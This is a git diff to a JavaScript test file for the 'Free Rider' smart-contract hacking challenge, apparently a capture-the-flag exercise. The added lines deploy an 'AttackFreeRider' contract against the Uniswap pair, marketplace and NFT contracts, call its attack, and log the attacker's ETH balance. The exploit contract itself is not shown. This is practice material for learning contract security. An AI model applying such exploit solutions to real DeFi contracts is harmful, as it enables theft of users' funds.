@@ -105,6 +105,17 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.attackFreeRider = await (await ethers.getContractFactory('AttackFreeRider', attacker)).deploy(
+            this.uniswapPair.address, 
+            this.marketplace.address,
+            this.buyerContract.address,
+            this.nft.address,
+            this.weth.address
+        )
+        await this.attackFreeRider.attack(NFT_PRICE)
+        attackerEthBalance = await ethers.provider.getBalance(attacker.address)
+        console.log(`Attacker ETH balance ${attackerEthBalance.toString()/10**18}`)
+
     });
 
     after(async function () {
